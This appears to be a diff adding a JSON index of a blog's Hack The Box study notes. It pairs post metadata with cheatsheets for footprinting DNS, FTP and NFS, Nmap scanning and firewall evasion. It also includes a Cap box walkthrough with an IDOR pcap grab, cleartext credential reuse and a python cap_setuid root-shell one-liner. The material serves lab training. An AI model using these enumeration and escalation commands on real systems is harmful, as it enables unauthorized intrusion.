@@ -1,0 +1,86 @@
+[
+  {
+    "id": "dns",
+    "title": "Footprinting DNS",
+    "date": "2026-10-20",
+    "series": "Footprinting Services",
+    "tags": ["htb", "footprinting", "dns", "bind9", "dig", "zone-transfer", "axfr", "enumeration"],
+    "description": "DNS servers and records, Bind9 config and zone files, dangerous settings, dig queries, AXFR zone transfers and subdomain brute forcing.",
+    "cheatsheet": [
+      { "cmd": "dig soa <domain>", "desc": "SOA record (admin contact, serial)" },
+      { "cmd": "dig ns <domain> @<server>", "desc": "List the nameservers" },
+      { "cmd": "dig any <domain> @<server>", "desc": "All records the server will disclose" },
+      { "cmd": "dig CH TXT version.bind @<server>", "desc": "Grab the BIND version" },
+      { "cmd": "dig axfr <domain> @<server>", "desc": "Zone transfer (AXFR) - the money shot" },
+      { "cmd": "dig axfr internal.<domain> @<server>", "desc": "Try internal/other zones too" },
+      { "cmd": "dnsenum --dnsserver <server> --enum -f <wordlist> <domain>", "desc": "Brute force subdomains" }
+    ]
+  },
+  {
+    "id": "cap",
+    "title": "Cap - HTB Walkthrough",
+    "date": "2026-10-19",
+    "tags": ["htb", "walkthrough", "linux", "idor", "wireshark", "capabilities", "privesc"],
+    "description": "Easy Linux box: IDOR to grab a pcap, FTP creds in clear text, SSH as nathan, then root through python3.8 with cap_setuid.",
+    "cheatsheet": [
+      { "cmd": "nmap -sT -sC -sV -O -p- --min-rate 10000 <target>", "desc": "Full TCP port scan" },
+      { "cmd": "browse to /data/0", "desc": "IDOR - grab another user's pcap" },
+      { "cmd": "Wireshark: filter 'ftp' > Follow TCP Stream", "desc": "Read FTP creds in clear text" },
+      { "cmd": "ssh nathan@<target>", "desc": "Login (password reuse from FTP)" },
+      { "cmd": "getcap -r / 2>/dev/null", "desc": "Find files with capabilities" },
+      { "cmd": "/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "desc": "Root via cap_setuid" }
+    ]
+  },
+  {
+    "id": "ftp",
+    "title": "Footprinting FTP",
+    "date": "2026-10-15",
+    "series": "Footprinting Services",
+    "tags": ["htb", "footprinting", "ftp", "tftp", "vsftpd", "enumeration"],
+    "description": "How FTP and TFTP work, vsFTPd config and dangerous settings, anonymous login, downloading/uploading files and enumerating with Nmap and openssl.",
+    "cheatsheet": [
+      { "cmd": "ftp <target>", "desc": "Connect (try anonymous / anonymous)" },
+      { "cmd": "nmap -sV -p21 -sC -A <target>", "desc": "Footprint FTP with NSE scripts" },
+      { "cmd": "ls -R", "desc": "Recursive directory listing" },
+      { "cmd": "get <file>  /  put <file>", "desc": "Download / upload a file" },
+      { "cmd": "wget -m --no-passive ftp://anonymous:anonymous@<target>", "desc": "Mirror everything" },
+      { "cmd": "openssl s_client -connect <target>:21 -starttls ftp", "desc": "Inspect TLS cert" },
+      { "cmd": "nc -nv <target> 21   /   telnet <target> 21", "desc": "Grab the banner manually" }
+    ]
+  },
+  {
+    "id": "nfs",
+    "title": "Footprinting NFS",
+    "date": "2026-10-14",
+    "series": "Footprinting Services",
+    "tags": ["htb", "footprinting", "nfs", "enumeration", "privesc"],
+    "description": "How NFS works, its dangerous settings, how to enumerate and mount shares, and abusing UID trust with a SUID shell.",
+    "cheatsheet": [
+      { "cmd": "nmap -p111,2049 -sV -sC <target>", "desc": "Footprint NFS / RPC" },
+      { "cmd": "nmap --script nfs* -p111,2049 <target>", "desc": "NFS NSE scripts (ls, showmount, statfs)" },
+      { "cmd": "showmount -e <target>", "desc": "List the exported shares" },
+      { "cmd": "mkdir t && sudo mount -t nfs <target>:/ ./t/ -o nolock", "desc": "Mount a share" },
+      { "cmd": "ls -l t/   /   ls -n t/", "desc": "View owners / raw UIDs & GIDs" },
+      { "cmd": "sudo umount ./t", "desc": "Unmount when done" }
+    ]
+  },
+  {
+    "id": "nmap",
+    "title": "Network Enumeration with Nmap",
+    "date": "2026-10-11",
+    "tags": ["htb", "nmap", "enumeration", "pentest"],
+    "description": "My notes from the HTB Academy Nmap module: host discovery, port scanning, service enumeration, NSE and firewall evasion.",
+    "cheatsheet": [
+      { "cmd": "nmap -sn 10.129.2.0/24", "desc": "Host discovery (no port scan)" },
+      { "cmd": "nmap -sS <target>", "desc": "Default SYN scan" },
+      { "cmd": "nmap -p- <target>", "desc": "Scan all 65535 ports" },
+      { "cmd": "nmap -sV -sC <target>", "desc": "Version detection + default scripts" },
+      { "cmd": "nmap -sU <target>", "desc": "UDP scan" },
+      { "cmd": "nmap -A <target>", "desc": "Aggressive: OS, version, scripts, traceroute" },
+      { "cmd": "nmap --script vuln <target>", "desc": "Run the vuln NSE category" },
+      { "cmd": "nmap -sA -Pn <target>", "desc": "ACK scan (map firewall rules)" },
+      { "cmd": "nmap -D RND:5 <target>", "desc": "Hide behind 5 random decoys" },
+      { "cmd": "nmap --source-port 53 <target>", "desc": "Scan from a trusted source port" }
+    ]
+  }
+]
